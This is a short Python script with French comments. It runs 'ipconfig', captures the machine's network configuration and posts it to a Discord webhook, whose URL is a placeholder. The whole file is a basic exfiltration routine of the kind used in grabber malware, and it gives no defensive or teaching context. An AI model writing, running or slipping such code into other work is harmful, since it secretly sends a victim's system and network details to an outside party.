import os
import requests
import json

# Exécute la commande ipconfig et capture la sortie
ipconfig_process = os.popen("ipconfig")
ipconfig_output = ipconfig_process.read()

# Prépare le message avec la sortie de la commande ipconfig
data = {
    "content": "```\n" + ipconfig_output + "\n```"
}

# URL du webhook Discord
webhook_url = "ton webhook"

# Envoie le message au Webhook Discord
response = requests.post(webhook_url, json=data)


